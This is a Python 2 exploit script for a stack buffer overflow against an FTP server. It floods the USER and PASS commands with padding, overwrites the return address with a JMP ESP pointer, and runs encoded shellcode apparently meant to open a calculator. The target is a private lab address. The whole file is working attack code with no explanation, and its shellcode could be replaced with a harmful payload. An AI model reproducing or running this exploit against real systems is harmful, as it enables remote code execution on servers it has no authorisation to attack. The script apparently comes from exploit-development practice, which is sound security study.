#!/usr/bin/env python2
import socket
import struct

# set up the IP and port we're connecting to
RHOST = "10.0.2.8"
RPORT = 21

buf_totlen = 2500
offset_srp = 2007

ptr_jmp_esp = 0x7c9d30d7

sub_esp_10 = "\x83\xec\x10"

shellcode_calc =  ""
shellcode_calc += "\xb8\xa2\xf0\x26\x08\xd9\xcd\xd9\x74\x24"
shellcode_calc += "\xf4\x5a\x31\xc9\xb1\x31\x31\x42\x13\x83"
shellcode_calc += "\xc2\x04\x03\x42\xad\x12\xd3\xf4\x59\x50"
shellcode_calc += "\x1c\x05\x99\x35\x94\xe0\xa8\x75\xc2\x61"
shellcode_calc += "\x9a\x45\x80\x24\x16\x2d\xc4\xdc\xad\x43"
shellcode_calc += "\xc1\xd3\x06\xe9\x37\xdd\x97\x42\x0b\x7c"
shellcode_calc += "\x1b\x99\x58\x5e\x22\x52\xad\x9f\x63\x8f"
shellcode_calc += "\x5c\xcd\x3c\xdb\xf3\xe2\x49\x91\xcf\x89"
shellcode_calc += "\x01\x37\x48\x6d\xd1\x36\x79\x20\x6a\x61"
shellcode_calc += "\x59\xc2\xbf\x19\xd0\xdc\xdc\x24\xaa\x57"
shellcode_calc += "\x16\xd2\x2d\xbe\x67\x1b\x81\xff\x48\xee"
shellcode_calc += "\xdb\x38\x6e\x11\xae\x30\x8d\xac\xa9\x86"
shellcode_calc += "\xec\x6a\x3f\x1d\x56\xf8\xe7\xf9\x67\x2d"
shellcode_calc += "\x71\x89\x6b\x9a\xf5\xd5\x6f\x1d\xd9\x6d"
shellcode_calc += "\x8b\x96\xdc\xa1\x1a\xec\xfa\x65\x47\xb6"
shellcode_calc += "\x63\x3f\x2d\x19\x9b\x5f\x8e\xc6\x39\x2b"
shellcode_calc += "\x22\x12\x30\x76\x28\xe5\xc6\x0c\x1e\xe5"
shellcode_calc += "\xd8\x0e\x0e\x8e\xe9\x85\xc1\xc9\xf5\x4f"
shellcode_calc += "\xa6\x36\x14\x5a\xd2\xde\x81\x0f\x5f\x83"
shellcode_calc += "\x31\xfa\xa3\xba\xb1\x0f\x5b\x39\xa9\x65"
shellcode_calc += "\x5e\x05\x6d\x95\x12\x16\x18\x99\x81\x17"
shellcode_calc += "\x09\xfa\x44\x84\xd1\xd3\xe3\x2c\x73\x2c"

# build a message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))
buf += struct.pack("<I", ptr_jmp_esp)
buf += "BBBB"
buf += sub_esp_10
buf += shellcode_calc
buf += "D"*(buf_totlen - len(buf))

# send the message
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((RHOST, RPORT))
s.recv(1024)
s.send('USER ' + buf + '\r\n')
s.recv(1024)
s.send('PASS ' + buf + '\r\n')
s.send('QUIT\r\n')
s.close()
